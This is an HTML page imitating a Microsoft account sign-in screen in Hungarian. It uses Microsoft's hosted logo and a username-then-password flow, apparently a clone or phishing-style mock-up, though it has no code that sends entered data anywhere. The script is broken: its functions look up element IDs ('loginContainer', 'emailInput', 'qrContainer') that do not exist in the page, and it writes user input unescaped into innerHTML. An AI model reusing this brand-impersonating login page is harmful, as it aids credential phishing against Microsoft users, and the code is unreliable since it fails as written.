<html lang="en">
<head>
    <meta charset="utf-8"/>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <title>Login Page</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet"/>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
</head>
<body class="bg-gradient">
    <div class="container-fluid h-100 d-flex justify-content-center align-items-center" style="background: linear-gradient(to right, #fee2e2, #dbeafe,  #dcfce7);">
        <div class="card" style="max-width: 400px; width: 100%; background-color: transparent; border: none;">
            <div class="card-body shadow rounded" style="background-color: white;">
                <div class="mb-4">
                    <img alt="Microsoft logo" class="mb-4" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg"/>
                    <div class="text-center">
                        <h3 class="text-xl font-semibold mb-2">Bejelentkezés</h3>
                        <p class="text-sm text-gray-700">E-mail, telefon, vagy Skype</p>
                    </div>
                </div>
                <div class="form-group">
                    <input class="form-control" id="username" placeholder="Felhasználónév" type="text"/>
                </div>
                <div class="d-flex justify-content-between mb-4">
                    <a class="text-primary small" href="#">Nincs fiókja? Hozzon létre egyet!</a>
                </div>
                <div class="d-flex justify-content-between mb-4">
                    <a class="text-primary small" href="#">Nem tud bejelentkezni a fiókjába?</a>
                </div>
                <div class="d-flex justify-content-end">
                    <button class="btn btn-outline-secondary mr-2" type="button">Vissza</button>
                    <button onclick="showPasswordField()" class="btn btn-primary" type="button">Tovább</button>
                </div>
            </div>
            <div class="mt-3" style="background-color: transparent !important;">
                <div class="row">
                    <div class="col-12 mb-2 ">
                        <button class="btn btn-light btn-block shadow" onclick="showQRCode()">
                            <span><i class="fas fa-qrcode mr-2"></i> QR Code</span>
                        </button>
                    </div>
                    <div class="col-12 ">
                        <button class="btn btn-light btn-block shadow">
                            <i class="fas fa-cog mr-2"></i>
                            <span>Bejelentkezési beállítások</span>
                        </button>
                    </div>
                </div>
            </div>
        </div>
        
    </div>
    <footer class="text-center p-4 text-muted text-xs">
        <a class="text-muted" href="#">Használati feltételek</a>
        <span class="mx-2">|</span>
        <a class="text-muted" href="#">Adatvédelem és cookie-k</a>

    </footer>
</body>
<script class="">
    function showPasswordField() {
        let loginContainer = document.getElementById('loginContainer');
        let emailInput = document.getElementById('emailInput').value;
        
        if (emailInput.trim() === "") {
            alert("Kérjük, adjon meg egy e-mail címet, telefonszámot vagy Skype azonosítót!");
            return;
        }
        
        loginContainer.classList.add('hidden');
        setTimeout(() => {
            loginContainer.innerHTML = `
                <img src='https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg' alt='Microsoft Logo' class='logo'>
                <h1 class='fs-4 fw-semibold mb-2 text-center'>Adja meg jelszavát</h1>
                <p class='fs-6 text-secondary text-center'>` + emailInput + `</p>
                <input type='password' class='form-control my-3' placeholder='Jelszó'>
                <button class='btn btn-primary w-100 mb-3'>Bejelentkezés</button>
                <div class='d-flex justify-content-between mb-2'>
                    <a href='#' class='text-decoration-none text-primary'>Elfelejtette jelszavát?</a>
                </div>
            `;
            loginContainer.classList.remove('hidden');
        }, 300);
    }
    
    function showQRCode() {
        document.getElementById('qrContainer').style.display = 'block';
    }
</script>
</html>
